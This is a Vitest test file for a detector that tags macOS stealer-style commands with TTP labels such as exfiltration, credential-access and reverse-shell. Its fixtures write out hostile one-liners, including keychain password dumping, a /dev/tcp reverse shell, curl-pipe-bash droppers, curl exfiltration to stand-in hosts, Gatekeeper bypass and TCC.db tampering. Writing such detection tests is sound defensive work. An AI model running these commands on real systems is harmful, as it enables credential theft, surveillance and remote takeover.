import { describe, it, expect } from 'vitest';
import { deriveCapabilities } from '../src/capabilities';

 // Canonical stealer command set — representative strings a stealer would
 // generate/execute, used to verify TTP tagging.

const STEALER_TEXTS = [
  'curl -X POST http://x/y -F file=@/tmp/out.zip',
  'system_profiler SPHardwareDataType',
  'do shell script "security find-generic-password -ga login.keychain"',
  'ditto -c -k /tmp/bundle /tmp/out.zip',
  'rm -rf /tmp/x',
];

describe('deriveCapabilities', () => {
  it('detects expected TTP tags from canonical stealer command set', () => {
    const caps = deriveCapabilities(STEALER_TEXTS);
    const tags = caps.map((c) => c.tag);

    expect(tags).toContain('exfiltration');
    expect(tags).toContain('recon');
    expect(tags).toContain('credential-access');
    expect(tags).toContain('archive/staging');
    expect(tags).toContain('cleanup');
  });

  it('each capability has non-empty evidence trimmed to <= 80 chars', () => {
    const caps = deriveCapabilities(STEALER_TEXTS);
    for (const cap of caps) {
      expect(cap.evidence.length).toBeGreaterThan(0);
      expect(cap.evidence.length).toBeLessThanOrEqual(80);
    }
  });

  it('deduplicate: each tag appears at most once', () => {
    // Supply "exfiltration"-matching text twice
    const texts = [
      'curl -X POST http://a/b -F file=@/tmp/a.zip',
      'curl -d @data http://c/d',
    ];
    const caps = deriveCapabilities(texts);
    const exfilEntries = caps.filter((c) => c.tag === 'exfiltration');
    expect(exfilEntries).toHaveLength(1);
  });

  it('returns [] for empty/benign input', () => {
    expect(deriveCapabilities([])).toEqual([]);
    expect(deriveCapabilities(['hello world', 'echo "no threats here"'])).toEqual([]);
  });

  it('preserves rule order in output', () => {
    // exfiltration comes before cleanup in the rule table
    const caps = deriveCapabilities(STEALER_TEXTS);
    const tags = caps.map((c) => c.tag);
    const exfilIdx = tags.indexOf('exfiltration');
    const cleanupIdx = tags.indexOf('cleanup');
    expect(exfilIdx).toBeGreaterThanOrEqual(0);
    expect(cleanupIdx).toBeGreaterThanOrEqual(0);
    expect(exfilIdx).toBeLessThan(cleanupIdx);
  });

  it('tags a hidden-answer display dialog as phishing', () => {
    const caps = deriveCapabilities(['macOS needs your password. [captures password]']);
    expect(caps.map((c) => c.tag)).toContain('phishing');
  });

  it('tags VM/hypervisor detection strings as anti-analysis', () => {
    const caps = deriveCapabilities(['memData contains "VMware" or memData contains "QEMU"']);
    expect(caps.map((c) => c.tag)).toContain('anti-analysis');
  });

  it('does not false-positive on "Edge" inside an unrelated word or phrase', () => {
    expect(deriveCapabilities(['this is an edge case, not a browser'])).toEqual([]);
  });

  it('does not false-positive on "wallet" as a substring of a variable name', () => {
    expect(deriveCapabilities(['walletMap lookup failed'])).toEqual([]);
  });

  it('still tags a real browser-data path', () => {
    const caps = deriveCapabilities(['~/Library/Application Support/Microsoft Edge/Default/Cookies.binarycookies']);
    expect(caps.map((c) => c.tag)).toContain('browser-data');
  });

  it('tags a Gatekeeper-bypass combo as defense-evasion', () => {
    const caps = deriveCapabilities([
      'spctl --master-disable',
      'csrutil status',
      'xattr -d com.apple.quarantine /tmp/app',
      'codesign --remove-signature /tmp/app',
    ]);
    expect(caps.map((c) => c.tag)).toContain('defense-evasion');
  });

  it('tags NSPasteboard (ObjC-bridge clipboard access) as clipboard, not just pbpaste', () => {
    const caps = deriveCapabilities(['$.NSPasteboard.generalPasteboard.stringForType()']);
    expect(caps.map((c) => c.tag)).toContain('clipboard');
  });

  it('tags a keystroke GUI-automation event as gui-automation', () => {
    const caps = deriveCapabilities(['keystroke AdminPassword123']);
    expect(caps.map((c) => c.tag)).toContain('gui-automation');
  });

  it('tags a login item install as login-item-persistence', () => {
    const caps = deriveCapabilities(['make new login item at end of login items with properties {path:"/tmp/x.app", hidden:true}']);
    expect(caps.map((c) => c.tag)).toContain('login-item-persistence');
  });

  it('tags killall targeting a security tool as security-tool-kill', () => {
    const caps = deriveCapabilities(['do shell script "killall -9 \\"Little Snitch\\""']);
    expect(caps.map((c) => c.tag)).toContain('security-tool-kill');
  });

  it('does not false-positive security-tool-kill on an unrelated killall', () => {
    expect(deriveCapabilities(['killall Finder'])).toEqual([]);
  });

  it('tags .xcodeproj/project.pbxproj tampering as xcode-injection', () => {
    const caps = deriveCapabilities(['do shell script "cat ~/Library/Developer/Xcode/DerivedData/App/project.pbxproj"']);
    expect(caps.map((c) => c.tag)).toContain('xcode-injection');
  });

  it('tags chat.db targeting as imessage', () => {
    const caps = deriveCapabilities(['do shell script "cp ~/Library/Messages/chat.db /tmp/x"']);
    expect(caps.map((c) => c.tag)).toContain('imessage');
  });

  it('tags avfoundation capture as av-capture', () => {
    const caps = deriveCapabilities(['do shell script "ffmpeg -f avfoundation -i \\":0\\" /tmp/mic.wav"']);
    expect(caps.map((c) => c.tag)).toContain('av-capture');
  });

  it('tags a curl-pipe-shell dropper as curl-pipe-shell', () => {
    const caps = deriveCapabilities(['do shell script "curl -fsSL https://x/install.sh | bash"']);
    expect(caps.map((c) => c.tag)).toContain('curl-pipe-shell');
  });

  it('does not false-positive curl-pipe-shell on a plain curl -o download', () => {
    const caps = deriveCapabilities(['curl -o /tmp/x https://x/y']);
    expect(caps.map((c) => c.tag)).not.toContain('curl-pipe-shell');
  });

  it('tags a clipboard-injected curl|bash one-liner as clickfix', () => {
    const caps = deriveCapabilities(['set the clipboard to curl -fsSL https://x/install.sh | bash']);
    expect(caps.map((c) => c.tag)).toContain('clickfix');
  });

  it('does not false-positive clickfix on an ordinary clipboard write', () => {
    expect(deriveCapabilities(['set the clipboard to "hello world"'])).toEqual([]);
  });

  it('tags a Terminal.app do-script sink as terminal-app-automation', () => {
    const caps = deriveCapabilities(['Terminal do script curl -fsSL https://x/install.sh | bash']);
    expect(caps.map((c) => c.tag)).toContain('terminal-app-automation');
  });

  it('tags a disk-image mount as dmg-mount', () => {
    const caps = deriveCapabilities(['do shell script "hdiutil attach /tmp/payload.dmg -nobrowse"']);
    expect(caps.map((c) => c.tag)).toContain('dmg-mount');
  });

  it('tags $.NSTask usage as nstask-execution', () => {
    const caps = deriveCapabilities(['$.NSTask.alloc.init.launch()']);
    expect(caps.map((c) => c.tag)).toContain('nstask-execution');
  });

  it('tags TCC.db tampering as tcc-manipulation', () => {
    const caps = deriveCapabilities(['do shell script "sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db \\"INSERT INTO access ...\\""']);
    expect(caps.map((c) => c.tag)).toContain('tcc-manipulation');
  });

  it('tags a reverse-shell one-liner as reverse-shell', () => {
    const caps = deriveCapabilities(['do shell script "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"']);
    expect(caps.map((c) => c.tag)).toContain('reverse-shell');
  });

  it('tags a configuration-profile install as profile-install', () => {
    const caps = deriveCapabilities(['do shell script "profiles install -type configuration -path /tmp/rogue.mobileconfig"']);
    expect(caps.map((c) => c.tag)).toContain('profile-install');
  });

  it('tags a composed Mail.app outgoing message as mail-exfiltration', () => {
    const caps = deriveCapabilities(['make new outgoing message with properties {subject:"data", content:"stolen"}']);
    expect(caps.map((c) => c.tag)).toContain('mail-exfiltration');
  });
});
